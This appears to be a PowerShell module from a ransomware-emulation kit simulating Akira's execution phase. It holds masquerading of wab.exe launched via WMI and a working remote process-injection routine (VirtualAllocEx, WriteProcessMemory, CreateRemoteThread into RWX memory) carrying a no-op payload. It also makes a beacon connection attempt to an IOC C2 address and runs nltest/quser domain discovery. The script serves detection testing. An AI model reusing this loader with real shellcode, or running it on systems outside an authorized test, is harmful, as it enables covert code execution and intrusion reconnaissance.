# ============================================================================
# AKIRA SIMULATION - PHASE 2: EXECUTION & PROCESS INJECTION (AdaptixC2)
# ============================================================================
# Simulates: WMI-spawned AdgNsy.exe (renamed WAB.exe) + real (but harmless)
# remote process injection to reproduce the RWX/unbacked-memory forensic
# signature described in the report, then AdaptixC2 beacon + initial
# hands-on-keyboard discovery.
# MITRE: T1055 Process Injection, T1047 WMI, T1036 Masquerading, T1071.001 C2
# ============================================================================

function Simulate-ExecutionAndInjection {
    param($SimPaths)

    Write-Host "[+] Phase 2: Execution & Process Injection - AdaptixC2 ..." -ForegroundColor Green

    # --- Rename the real Windows Address Book utility to AdgNsy.exe (masquerading) ---
    $wabSrc = "$env:SystemRoot\System32\wab.exe"
    $adgNsyPath = "$env:LOCALAPPDATA\AdgNsy.exe"
    if (Test-Path $wabSrc) {
        Copy-Item -Path $wabSrc -Destination $adgNsyPath -Force
    } else {
        New-DecoyBinary -Path $adgNsyPath -SizeBytes 202752 | Out-Null
    }

    # --- Launch it via WMI so ParentImage=WmiPrvSE.exe / ParentCommandLine matches the report ---
    # ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
    # ParentCommandLine: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
    # CommandLine: C:\Users\<user>\AppData\Local\AdgNsy.exe
    try {
        $wmiProc = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{
            CommandLine = "`"$adgNsyPath`""
        }
        $adgNsyPid = $wmiProc.ProcessId
        Write-SimEvent -EventId 2001 -Message "SIMULATION: AdgNsy.exe (masqueraded WAB.exe) launched via WMI, PID=$adgNsyPid"
    } catch {
        Write-Warning "WMI process creation failed: $_"
    }

    Start-Sleep -Seconds 2

    # --- Real (harmless) remote process injection to reproduce the exact memory
    #     forensic artifacts described in the report: unbacked execution, a thread
    #     entry point outside the module's image, and private RWX memory regions.
    #     Payload is a NOP sled + RET (does nothing but return) - never contacts
    #     network, exfiltrates data, or persists. This is the same class of
    #     VirtualAllocEx/WriteProcessMemory/CreateRemoteThread primitive AdaptixC2
    #     and most shellcode loaders use, minus any actual capability. #>
    if ($adgNsyPid) {
        $injectSrc = @"
using System;
using System.Runtime.InteropServices;

public class SimInjector {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int access, bool inherit, int pid);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr addr, uint size, uint allocType, uint protect);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr addr, byte[] buffer, uint size, out int written);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr sa, uint stackSize, IntPtr startAddr, IntPtr param, uint flags, out IntPtr threadId);

    public static void Inject(int pid) {
        // 90 90 90 90 C3 = NOP NOP NOP NOP RET  (executes and immediately returns - no-op shellcode)
        byte[] shellcode = new byte[] { 0x90, 0x90, 0x90, 0x90, 0xC3 };
        IntPtr hProcess = OpenProcess(0x1F0FFF, false, pid); // PROCESS_ALL_ACCESS
        if (hProcess == IntPtr.Zero) { return; }
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000 /*MEM_COMMIT|MEM_RESERVE*/, 0x40 /*PAGE_EXECUTE_READWRITE*/);
        int written;
        WriteProcessMemory(hProcess, addr, shellcode, (uint)shellcode.Length, out written);
        IntPtr tid;
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out tid);
    }
}
"@
        try {
            Add-Type -TypeDefinition $injectSrc -Language CSharp -ErrorAction Stop
            [SimInjector]::Inject($adgNsyPid)
            Write-SimEvent -EventId 2002 -Message "SIMULATION: Reflective injection of no-op shellcode into AdgNsy.exe (PID=$adgNsyPid) - reproduces RWX/unbacked-memory forensic signature"
        } catch {
            Write-Warning "Injection demo failed (non-fatal): $_"
        }
    }

    # --- AdaptixC2 beacon config artifact + real outbound beacon attempt ---
    $c2Config = @"
{
  "listener": "http",
  "profile": "default",
  "c2_host": "$($Global:AkiraIOCs.AdaptixC2IP)",
  "c2_port": 443,
  "sleep": 5,
  "jitter": 10
}
"@
    Set-Content -Path "$($SimPaths.Payloads)\adaptixc2_beacon_config.json" -Value $c2Config -Force
    Invoke-SafeNetworkAttempt -Target $Global:AkiraIOCs.AdaptixC2IP -Port 443
    Write-SimEvent -EventId 2003 -Message "SIMULATION: AdaptixC2 HTTP beacon established to $($Global:AkiraIOCs.AdaptixC2IP)"

    # --- Initial hands-on-keyboard discovery (real, safe, native commands) ---
    Write-Host "    Running initial discovery batch (systeminfo/nltest/whoami/ping) ..." -ForegroundColor DarkGray
    $discoveryLog = "$($SimPaths.Logs)\discovery_phase2.log"
    $domainSuffix = if (Test-DomainJoined) { (Get-CimInstance Win32_ComputerSystem).Domain } else { "REDACTED.lan" }

    $cmds = @(
        "systeminfo",
        "nltest /dclist:",
        "whoami /groups",
        "nltest /domain_trusts",
        "nltest /dclist:$domainSuffix",
        "ping -n 1 $domainSuffix",
        "quser /server:$domainSuffix",
        "dir C:\programdata"
    )
    foreach ($c in $cmds) {
        try {
            $out = cmd.exe /c "$c" 2>&1 | Out-String
            Add-Content -Path $discoveryLog -Value "> $c`r`n$out`r`n"
        } catch {}
    }

    Write-Host "  [OK] Execution/Injection artifacts created" -ForegroundColor Yellow
    return $adgNsyPid
}
